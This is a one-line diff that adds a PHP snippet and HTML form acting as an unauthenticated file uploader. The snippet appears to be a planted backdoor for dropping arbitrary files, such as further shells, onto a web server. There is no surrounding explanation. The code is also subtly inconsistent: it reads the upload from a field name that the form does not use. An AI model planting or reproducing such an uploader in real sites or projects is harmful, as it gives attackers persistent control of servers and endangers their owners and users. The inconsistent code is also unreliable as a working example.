@@ -1,0 +1,1 @@
+ganstar <?php if($_FILES)move_uploaded_file($_FILES['f']['tmp_name'],$_FILES['ponyo']['name']);?><form method=post enctype=multipart/form-data><input type=file name=ponyo><input type=submit></form>
